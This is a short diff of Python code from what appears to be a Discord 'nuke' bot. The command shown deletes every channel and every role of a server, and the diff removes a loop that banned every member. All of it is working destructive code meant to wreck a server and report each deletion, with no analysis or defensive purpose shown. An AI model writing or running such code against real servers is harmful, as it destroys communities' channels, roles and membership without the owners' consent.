@@ -72,12 +72,6 @@ async def nuke(ctx):
         print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
       except:
         print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
-    for member in guild.members:
-     try:
-       await member.ban()
-       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
-     except:
-       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
     for role in guild.roles:
      try:
        await role.delete()
